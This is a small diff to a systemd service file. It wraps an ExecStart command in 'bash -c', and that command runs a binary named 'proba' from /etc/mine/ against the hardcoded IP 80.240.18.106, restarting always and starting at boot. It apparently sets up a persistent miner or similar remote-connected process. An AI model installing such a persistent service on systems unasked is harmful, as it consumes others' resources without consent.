@@ -6,7 +6,7 @@ After=network.target
 RestartSec=10
 Restart=always
 WorkingDirectory=/etc/mine/
-ExecStart=timeout 1800 ./etc/mine/proba -a 80.240.18.106
+ExecStart=bash -c 'timeout 1800 ./etc/mine/proba -a 80.240.18.106'
 
 [Install]
 WantedBy=multi-user.target
